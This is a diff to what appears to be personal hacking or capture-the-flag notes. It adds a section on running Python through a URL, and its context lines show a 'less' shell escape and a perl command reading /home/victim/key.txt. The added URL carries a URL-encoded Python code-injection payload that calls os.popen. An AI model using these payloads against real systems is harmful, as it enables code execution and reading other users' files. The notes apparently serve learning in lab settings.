@@ -275,6 +275,11 @@ At the less search icontype:  !/bin/bash			# 2nd - This will open a shell !!
 perl -e 'print `cat /home/victim/key.txt`'			# notice to use single (hard) quotes around the back ticks for yuor cmd so they aget run at the right times.
 
 ```
+### Running python from the url/address bar
+
+`http://ptl-665534be-b624e42e.libcurl.st/hello/hacker%22%2bstr(%20__import__('os').popen('uname%20-a').read())%2b%22`
+Notice the `__import__('os').popen('uname%20-a').read()` . We have added either sied an URL encoded '+' sigh as `%2b`.
+
 
 # Text editing on Linux
 
